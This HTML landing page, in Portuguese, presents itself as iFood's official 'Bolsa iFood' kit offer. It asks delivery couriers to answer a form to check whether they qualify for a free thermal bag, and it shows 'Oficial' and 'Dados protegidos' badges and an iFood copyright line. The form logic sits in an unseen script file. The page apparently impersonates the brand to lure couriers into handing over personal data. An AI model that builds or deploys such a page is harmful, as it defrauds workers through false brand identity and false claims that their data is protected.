<!DOCTYPE html>
<html lang="pt-BR">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="theme-color" content="#EA1D2C">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="default">
    <title>iFood Entregador - Kit Oficial</title>
    <meta name="description" content="Responda o formulário e verifique a elegibilidade para receber o kit parceiro iFood.">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css?v=3.0">
</head>

<body data-page="home">
    

    <header class="header">
        <div class="logo-container">
            <img src="assets/ifoodentregadores.webp" alt="iFood Entregador" class="ifood-logo ifood-logo--wide">
        </div>
    </header>

    <noscript class="no-js">Para continuar, ative o JavaScript no navegador.</noscript>

    <main class="container">
        <section class="step fade-in-up" aria-hidden="false">
            <div class="badge-container">
                <span class="badge">Oficial</span>
            </div>

            <h1>Bolsa iFood Oficial</h1>
            <p>Responda o formulário para verificar se você é qualificado para receber o kit parceiro em casa.</p>

            <div class="hero-image">
                <img src="assets/bagfoto.webp" alt="Mochila iFood" loading="eager">
            </div>

            <div class="benefits">
                <div class="benefit-item">Térmica</div>
                <div class="benefit-item">Impermeável</div>
                <div class="benefit-item">Expansível</div>
            </div>

            <div class="action-stack">
                <button id="btn-start" class="btn-primary" type="button">Quero participar</button>
            </div>

            <div class="trust-strip">
                <div class="trust-item trust-item--stack">
                    <span class="trust-icon trust-icon--ok" aria-hidden="true">
                        <svg viewBox="0 0 24 24" role="img" focusable="false">
                            <path d="M9.2 16.6 4.7 12l1.6-1.6 2.9 2.9 8-8 1.6 1.6Z"></path>
                        </svg>
                    </span>
                    <span>Processo rápido</span>
                </div>
                <div class="trust-item trust-item--stack">
                    <span class="trust-icon trust-icon--lock" aria-hidden="true">
                        <svg viewBox="0 0 24 24" role="img" focusable="false">
                            <path
                                d="M12 2a5 5 0 0 0-5 5v3H6a2 2 0 0 0-2 2v7a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-7a2 2 0 0 0-2-2h-1V7a5 5 0 0 0-5-5Zm-3 8V7a3 3 0 1 1 6 0v3H9Zm3 4a1.5 1.5 0 1 1 0 3 1.5 1.5 0 0 1 0-3Z">
                            </path>
                        </svg>
                    </span>
                    <span>Dados protegidos</span>
                </div>
                <div class="trust-item trust-item--stack">
                    <span class="trust-icon trust-icon--truck" aria-hidden="true">
                        <svg viewBox="0 0 24 24" role="img" focusable="false">
                            <path
                                d="M3 6h11v8h2.5l2.5 3v3h-2a2.5 2.5 0 0 1-5 0H9a2.5 2.5 0 0 1-5 0H2V6h1Zm3 14a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm10 0a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm-1.5-8V8H5v6h9.5Zm2 2h1.2L16 12Z">
                            </path>
                        </svg>
                    </span>
                    <span>Envio rastreado</span>
                </div>
            </div>

        </section>
    </main>

    <div id="toast" class="toast hidden" role="status" aria-live="polite"></div>

    <footer class="footer">
        <p>&copy; 2026 iFood. Todos os direitos reservados.</p>
    </footer>

    <script src="script.js" defer></script>
</body>

</html>
